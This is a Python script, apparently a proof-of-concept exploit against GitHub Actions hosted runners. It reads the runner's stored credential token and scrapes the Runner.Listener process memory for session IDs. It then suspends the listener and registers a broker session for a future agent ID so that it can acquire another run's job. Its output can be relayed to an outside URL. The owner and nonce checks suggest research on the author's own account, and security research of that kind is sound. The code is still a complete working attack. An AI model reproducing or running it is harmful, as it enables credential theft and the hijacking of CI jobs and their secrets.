#!/usr/bin/env python3
"""Pre-hold one future hosted agent and prove an owned receiver job was delivered."""

import base64
import glob
import json
import os
import pathlib
import re
import signal
import sys
import time
import urllib.error
import urllib.parse
import urllib.request


UUID = re.compile(rb"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}")
SAFE_REPOSITORY = re.compile(r"[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+\Z")
SAFE_NONCE = re.compile(r"[A-Za-z0-9_.:-]{8,160}\Z")


class ReceiverError(Exception):
    """An intentionally non-sensitive experiment failure."""


def required(name):
    value = os.environ.get(name, "")
    if not value:
        raise ReceiverError("missing_" + name.lower())
    return value


def emit(line):
    print(line, flush=True)
    endpoint = os.environ.get("BROKER_RESULT_RELAY", "")
    if endpoint:
        try:
            encoded = base64.urlsafe_b64encode(line.encode()).decode()
            urllib.request.urlopen(endpoint + "?d=" + urllib.parse.quote(encoded), timeout=3).read()
        except Exception:
            pass


def decode_jwt_claims(token):
    try:
        part = token.split(".", 2)[1]
        return json.loads(base64.urlsafe_b64decode(part + "=" * (-len(part) % 4)))
    except Exception:
        return {}


def request(method, url, token, body=None, timeout=8):
    data = json.dumps(body, separators=(",", ":")).encode() if body is not None else None
    call = urllib.request.Request(
        url,
        method=method,
        data=data,
        headers={
            "Authorization": "Bearer " + token,
            "Content-Type": "application/json",
            "User-Agent": "owned-broker-prehold-receiver-3900000",
        },
    )
    try:
        with urllib.request.urlopen(call, timeout=timeout) as response:
            return response.status, response.read(8 << 20)
    except urllib.error.HTTPError as error:
        return error.code, error.read(8 << 20)
    except OSError:
        return 0, b""


def valid_broker_url(value):
    parsed = urllib.parse.urlsplit(value)
    return (
        parsed.scheme == "https"
        and parsed.hostname == "broker.actions.githubusercontent.com"
        and parsed.port in (None, 443)
        and not parsed.username
        and not parsed.password
        and not parsed.query
        and not parsed.fragment
        and parsed.path.rstrip("/") == ""
    )


def acquire_url(value):
    parsed = urllib.parse.urlsplit(value)
    if (
        parsed.scheme != "https"
        or not parsed.hostname
        or not parsed.hostname.endswith(".actions.githubusercontent.com")
        or parsed.port not in (None, 443)
        or parsed.username
        or parsed.password
        or parsed.query
        or parsed.fragment
        or not parsed.path.endswith("/")
    ):
        return ""
    return urllib.parse.urljoin(value, "acquirejob")


def decode_context(value):
    """Decode the compact PipelineContextData representation used by the runner."""
    if not isinstance(value, dict) or not isinstance(value.get("t"), int):
        return value
    kind = value["t"]
    if kind == 1:
        return [decode_context(item) for item in value.get("a", [])]
    if kind in (2, 5):
        result = {}
        for pair in value.get("d", []):
            if isinstance(pair, dict) and isinstance(pair.get("k"), str):
                result[pair["k"]] = decode_context(pair.get("v"))
        return result
    return value


def case_get(value, key):
    if not isinstance(value, dict):
        return None
    expected = key.casefold()
    for current, item in value.items():
        if isinstance(current, str) and current.casefold() == expected:
            return item
    return None


def job_identity(job, raw, nonce):
    contexts = case_get(job, "contextData")
    github = decode_context(case_get(contexts, "github"))
    repository = case_get(github, "repository")
    run_id = case_get(github, "run_id")
    return (
        str(repository) if repository is not None else "",
        str(run_id) if run_id is not None else "",
        nonce if nonce.encode() in raw else "",
    )


def parse_json(raw):
    try:
        value = json.loads(raw)
    except Exception:
        return None
    return value if isinstance(value, dict) else None


def source_files():
    candidates = sorted(glob.glob("/home/runner/actions-runner/cached/*/.runner"))
    if not candidates:
        raise ReceiverError("runner_settings_unavailable")
    settings_path = pathlib.Path(candidates[-1])
    credentials_path = settings_path.with_name(".credentials")
    settings = json.loads(settings_path.read_text())
    credentials = json.loads(credentials_path.read_text())
    auth = credentials.get("data", credentials.get("Data", {}))
    token = auth.get("token", auth.get("Token", ""))
    base = settings.get("ServerUrlV2", settings.get("serverUrlV2", ""))
    if not token or not valid_broker_url(base):
        raise ReceiverError("source_credential_unavailable")
    claims = decode_jwt_claims(token)
    expires = int(claims.get("exp", time.time() + 1))
    if expires <= int(time.time()) + 60:
        raise ReceiverError("source_credential_expired")
    version = settings_path.parent.name
    try:
        source_agent_id = int(claims["runner_id"])
    except (KeyError, TypeError, ValueError):
        raise ReceiverError("source_agent_unavailable")
    return token, base.rstrip("/"), version, source_agent_id, str(claims.get("billing_owner_id", ""))


def listener_process():
    proc_root = os.environ.get("PROC_ROOT", "/proc")
    for item in os.listdir(proc_root):
        if not item.isdigit():
            continue
        try:
            command = open(proc_root + "/" + item + "/cmdline", "rb").read()
        except OSError:
            continue
        if b"Runner.Listener" in command and b"run" in command:
            return int(item)
    raise ReceiverError("listener_unavailable")


def session_candidates(pid):
    proc_root = os.environ.get("PROC_ROOT", "/proc")
    result = set()
    with open("%s/%d/mem" % (proc_root, pid), "rb", buffering=0) as memory:
        for line in open("%s/%d/maps" % (proc_root, pid)):
            columns = line.split()
            if len(columns) < 2 or not columns[1].startswith("rw"):
                continue
            start, end = (int(part, 16) for part in columns[0].split("-"))
            if end - start > 256 << 20:
                continue
            overlap = b""
            for address in range(start, end, 1 << 20):
                try:
                    memory.seek(address)
                    block = memory.read(min(1 << 20, end - address))
                except OSError:
                    break
                block = overlap + block
                for needle in (b"sessionId", b"sessionid", b"session%3D", b"sessionid%3d"):
                    offset = 0
                    while True:
                        offset = block.find(needle, offset)
                        if offset < 0:
                            break
                        result.update(UUID.findall(block[max(0, offset - 512):offset + 1024]))
                        offset += 4
                for parity in (0, 1):
                    narrow = block[parity::2]
                    for needle in (b"sessionId", b"sessionid"):
                        offset = 0
                        while True:
                            offset = narrow.find(needle, offset)
                            if offset < 0:
                                break
                            result.update(UUID.findall(narrow[max(0, offset - 256):offset + 512]))
                            offset += 4
                overlap = block[-4096:]
    if not result:
        raise ReceiverError("source_session_unavailable")
    return sorted(result)


def prehold(token, base, version, target, candidates, request_fn=request):
    session = {
        "ownerName": "owned-prehold-receiver-3900000",
        "agent": {
            "id": target,
            "name": "GitHub Actions %d" % target,
            "version": version,
            "osDescription": "Linux",
        },
        "brokerSession": True,
    }
    for candidate in candidates:
        request_fn("DELETE", base + "/session?" + urllib.parse.urlencode(
            {"sessionId": candidate.decode()}
        ), token)
        status, raw = request_fn("POST", base + "/session", token, session)
        parsed = parse_json(raw)
        held = case_get(parsed, "sessionId")
        if status == 201 and isinstance(held, str) and UUID.fullmatch(held.encode()):
            return held
    raise ReceiverError("prehold_not_created")


def receiver(token, base, version, held, expected_owner, expected_repo, expected_run,
             expected_nonce, hold_seconds, request_fn=request):
    suffix = base + "/message?" + urllib.parse.urlencode({
        "sessionId": held,
        "status": "Online",
        "runnerVersion": version,
        "os": "Linux",
        "architecture": "X64",
        "disableUpdate": "true",
    })
    deadline = time.monotonic() + hold_seconds
    while time.monotonic() < deadline:
        status, raw = request_fn("GET", suffix, token)
        message = parse_json(raw)
        message_type = case_get(message, "messageType")
        if status != 200 or message_type != "RunnerJobRequest":
            time.sleep(0.2)
            continue
        reference_raw = case_get(message, "body")
        try:
            reference = json.loads(reference_raw)
        except Exception:
            raise ReceiverError("invalid_runner_job_reference")
        if case_get(reference, "billing_owner_id") != expected_owner:
            raise ReceiverError("receiver_owner_mismatch")
        run_url = acquire_url(case_get(reference, "run_service_url"))
        runner_request_id = case_get(reference, "runner_request_id")
        if not run_url or not isinstance(runner_request_id, str) or not runner_request_id:
            raise ReceiverError("invalid_run_service_reference")
        acquire_status, job_raw = request_fn("POST", run_url, token, {
            "jobMessageId": runner_request_id,
            "runnerOS": "Linux",
            "billingOwnerId": expected_owner,
        })
        job = parse_json(job_raw)
        if acquire_status != 200 or job is None:
            raise ReceiverError("receiver_acquire_failed")
        repository, run_id, nonce = job_identity(job, job_raw, expected_nonce)
        if (
            repository.casefold() != expected_repo.casefold()
            or run_id != expected_run
            or nonce != expected_nonce
        ):
            raise ReceiverError("receiver_identity_mismatch")
        emit("BROKER_RECEIVER message_type=RunnerJobRequest repo=%s run=%s nonce=%s" %
             (repository, run_id, nonce))
        return
    raise ReceiverError("receiver_timeout")


def main():
    held = ""
    listener = None
    token = base = version = ""
    try:
        config_path = os.environ.get("BROKER_CONFIG_PATH", "")
        if config_path:
            loaded = json.load(open(config_path))
            for key in ("RECEIVER_BILLING_OWNER_ID", "RECEIVER_REPOSITORY",
                        "RECEIVER_RUN_ID", "RECEIVER_NONCE", "BROKER_HOLD_SECONDS"):
                if not isinstance(loaded.get(key), str):
                    raise ReceiverError("invalid_configuration_file")
                os.environ[key] = loaded[key]
        owner = required("RECEIVER_BILLING_OWNER_ID")
        repository = required("RECEIVER_REPOSITORY")
        run_id = required("RECEIVER_RUN_ID")
        nonce = required("RECEIVER_NONCE")
        hold_seconds = int(os.environ.get("BROKER_HOLD_SECONDS", "600"))
        if (
            not SAFE_REPOSITORY.fullmatch(repository)
            or not run_id.isdigit()
            or not SAFE_NONCE.fullmatch(nonce)
            or not 30 <= hold_seconds <= 900
        ):
            raise ReceiverError("invalid_configuration")
        token, base, version, source_agent_id, source_owner = source_files()
        target_text = required("TARGET_AGENT_ID")
        target = source_agent_id + 1 if target_text == "next" else int(target_text)
        if target <= 0 or source_owner != owner:
            raise ReceiverError("source_owner_mismatch")
        if target <= source_agent_id:
            raise ReceiverError("target_is_not_future")
        listener = listener_process()
        candidates = session_candidates(listener)
        os.kill(listener, signal.SIGSTOP)
        held = prehold(token, base, version, target, candidates)
        emit("BROKER_RECEIVER state=ready")
        receiver(token, base, version, held, owner, repository, run_id, nonce, hold_seconds)
        return 0
    except ReceiverError as error:
        emit("BROKER_RECEIVER result=" + str(error))
        return 2
    except Exception:
        emit("BROKER_RECEIVER result=internal_error")
        return 3
    finally:
        if held and token and base:
            request("DELETE", base + "/session?" + urllib.parse.urlencode(
                {"sessionId": held}
            ), token)
        if listener is not None:
            try:
                os.kill(listener, signal.SIGCONT)
            except OSError:
                pass


if __name__ == "__main__":
    raise SystemExit(main())
